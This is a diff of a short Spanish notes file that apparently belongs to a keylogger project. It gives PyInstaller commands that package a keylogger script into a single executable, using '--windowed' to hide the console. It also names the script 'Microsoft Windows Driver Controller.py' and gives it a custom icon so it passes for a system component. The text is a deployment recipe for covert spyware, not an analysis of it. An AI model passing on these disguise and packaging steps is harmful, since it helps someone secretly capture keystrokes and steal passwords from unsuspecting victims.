@@ -1,13 +1,13 @@
 
 C:\Python27\Scripts ## ubicacion delejecutable pyinstaller.exe
 
-C:\Users\Dulgless\Documents\Shuriken\Keylogger_Windows\Microsoft Windows Driver Controller.py
+C:\Users\User\Documents\Folder\Keylogger_Windows\Microsoft Windows Driver Controller.py
 
 python pyinstaller.exe --onefile --windowed --ico=anyimage.ico keylogger.py
 
 --onefile se utiliza para empaquetar todo en un ejecutable
---windowed evita que se abra una ventana (consola) cuando la aplicación se ejecuta
+--windowed evita que se abra una ventana (consola) cuando la aplicaciÃ³n se ejecuta
 
 Ejemplo:
 
-pyinstaller.exe --onefile --windowed --ico=C:\Users\Dulgless\Documents\Shuriken\Keylogger_Windows\wsecurty.ico "C:\Users\Dulgless\Documents\Shuriken\Keylogger_Windows\Microsoft Windows Driver Controller.py"
+pyinstaller.exe --onefile --windowed --ico=C:\Users\User\Documents\Shuriken\Keylogger_Windows\wsecurty.ico "C:\Users\User\Documents\Folder\Keylogger_Windows\Microsoft Windows Driver Controller.py"
